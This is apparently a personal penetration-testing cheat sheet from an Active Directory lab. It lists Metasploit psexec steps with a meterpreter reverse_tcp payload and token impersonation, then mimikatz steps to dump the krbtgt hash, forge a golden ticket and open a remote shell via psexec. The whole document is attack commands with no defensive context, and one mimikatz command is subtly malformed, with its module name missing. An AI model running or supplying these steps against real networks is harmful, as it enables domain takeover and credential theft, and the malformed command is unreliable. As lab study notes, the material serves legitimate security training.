---
title: GOLDEN TICKET
updated: 2023-11-27 06:53:00Z
created: 2023-09-29 05:03:34Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# TOKEN IMPERSONATION
1. Launch **msfconsole** 
2. `search psexec` 
3. `use 4`
4. `set payload windows/x64/meterpreter/reverse_tcp`
5. `set rhosts <target IP>`
6. `set smbuser user`
7. `set smbpasswd password`
8. `run`
9. `load incognito`
10. `list_tokens -u`
11. `impersonate_user DOMAIN\\user`
***

## GOLDEN TICKET
1. `mimikatz` 
2. `lsadump:: /inject /name:krbtgt`
Copy the domain SID, and the Primary NTLM hash
3. Generate Golden Ticket using format:
`kerberos::golden /user: /domain: /sid:<domainSID> /krbtgt:<NTLMHash> /id:<SId of Administrator>`
`kerberos::golden /user:Administrator /krbtgt:2112d895a265561c7acae62ce83a5504 /domain:marvel.local /sid:S-1-5-21-2078907545-1247724622 /ptt /id:500`
4. Now the ticket can be used
`misc::cmd`
5. **cmd**> `psexec.exe \\<target IP> cmd.exe`
***






